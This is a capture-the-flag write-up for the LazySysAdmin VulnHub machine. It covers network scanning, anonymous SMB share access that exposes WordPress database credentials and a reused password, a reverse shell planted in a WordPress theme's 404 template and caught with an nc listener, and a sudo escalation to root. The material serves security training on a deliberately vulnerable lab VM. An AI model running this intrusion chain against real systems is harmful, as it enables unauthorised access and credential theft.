# LazySysAdmin: 1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:70:d2:8a       PCS Systemtechnik GmbH
192.168.56.106  08:00:27:e3:a8:a2       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
```

The IP address is `192.168.56.106`, let's enumerate it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p22,80,139,445,3306,6667 -v -oN fullScan 192.168.56.106

Nmap scan report for 192.168.56.106
Host is up (0.00039s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 4 disallowed entries
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-generator: Silex v2.2.7
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  DDtb        Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info:
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.56.102
|_  error: Closing link: (nmap@192.168.56.102) [Client exited]
MAC Address: 08:00:27:E3:A8:A2 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 9m58s, deviation: 5h46m24s, median: 3h29m57s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2023-10-01T15:52:45
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2023-10-02T01:52:46+10:00
| nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   LAZYSYSADMIN<00>     Flags: <unique><active>
|   LAZYSYSADMIN<03>     Flags: <unique><active>
|   LAZYSYSADMIN<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
```

let's first go for SMB :

```bash
root@kali: smbmap -H 192.168.56.106

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.56.106:445      Name: 192.168.56.106            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share$                                                  READ ONLY       Sumshare
        IPC$                                                    NO ACCESS       IPC Service (Web server)
```

now connect ot `share$` :

```bash
root@kali: smbclient \\192.168.56.106\share$ -N

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Aug 15 07:05:52 2017
  ..                                  D        0  Mon Aug 14 08:34:47 2017
  wordpress                           D        0  Tue Aug 15 07:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017
  wp                                  D        0  Tue Aug 15 06:51:23 2017
  deets.txt                           N      139  Mon Aug 14 08:20:05 2017
  robots.txt                          N       92  Mon Aug 14 08:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017
  apache                              D        0  Mon Aug 14 08:35:19 2017
  index.html                          N    36072  Sun Aug  6 01:02:15 2017
  info.php                            N       20  Tue Aug 15 06:55:19 2017
  test                                D        0  Mon Aug 14 08:35:10 2017
  old                                 D        0  Mon Aug 14 08:35:13 2017
```

interesting forlder is wordpress let's see if we can find the wp-config.php file :

```bash
smb: \wordpress\> get wp-config.php
getting file \wordpress\wp-config.php of size 3703 as wp-config.php (1808.0 KiloBytes/sec) (average 1808.1 KiloBytes/sec)
smb: \wordpress\> exit
```

the content of `wp-config.php` file is :

```text
/** MySQL database username */
define('DB_USER', 'Admin');

/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

we also download the `deets.txt` from the share.

content of deets.txt

```text
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```

## 3.Gaining Shell

We can not connect to mysql remotely but can connect to wordpress admin panel using the credentials found in `wp-config.php`:

![wordpress panel](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f0e53320-202e-4a26-958d-b0f565a74b04)

now it is easy to get a reverse shell.

upload pentestmonkey php reverse shell into this path :

```text
Appereance -> editor -> 404 Template
```

![404](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2946e356-e603-4c32-b6cd-667455beccb5)

start a listener and navigate to `192.168.56.106/wordpress/wp-content/themes/twentyfifteen/404.php`

```bash
root@kali: nc -nvlp 4444

listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 34822
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 01:26:57 up  5:00,  0 users,  load average: 0.00, 0.00, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4.Privilege Escalation

navigate to `/home` and you see user `togie`.

change user to togie and privide the password `12345` we found in deets.txt previously :

```bash
www-data@LazySysAdmin:/var/www/html$ su togie
su togie
Password: 12345

togie@LazySysAdmin:/var/www/html$
```

check the sudo permissions :

```bash
togie@LazySysAdmin:/var/www/html$ sudo -l
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL

togie@LazySysAdmin:/var/www/html$ sudo bash

root@LazySysAdmin:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

root@LazySysAdmin:/var/www/html# cd /root

root@LazySysAdmin:/root# cat proof.txt
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851


Well done :)

Hope you learn't a few things along the way.

Regards,

Togie Mcdogie




Enjoy some random strings

WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
```

this is how you can become root on this machine :)




